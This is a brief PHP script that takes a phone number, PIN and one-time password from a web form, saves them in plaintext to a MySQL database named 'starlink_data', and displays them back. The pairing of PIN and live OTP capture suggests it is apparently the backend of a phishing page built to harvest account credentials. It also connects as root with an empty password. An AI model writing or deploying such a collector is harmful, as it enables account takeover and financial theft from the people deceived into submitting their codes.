<?php
// Database configuration
$host = "localhost";
$dbuser = "root";
$dbpass = "";
$dbname = "starlink_data";

// Create connection
$conn = new mysqli($host, $dbuser, $dbpass, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get form data
$number = $_POST['number'];
$pin = $_POST['pin'];
$otp = $_POST['otp'];

// Validate data
if (empty($number) || empty($pin) || empty($otp)) {
    die("All fields are required.");
}

// Insert data into database
$sql = "INSERT INTO user_data (number, pin, otp) VALUES (?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("sss", $number, $pin, $otp);

if ($stmt->execute()) {
    echo "<h2>Data saved successfully!</h2>";
    echo "Number: " . htmlspecialchars($number) . "
";
    echo "PIN: " . htmlspecialchars($pin) . "
";
    echo "OTP: " . htmlspecialchars($otp) . "
";
} else {
    echo "Error saving data: " . $stmt->error;
}

$stmt->close();
$conn->close();
?>
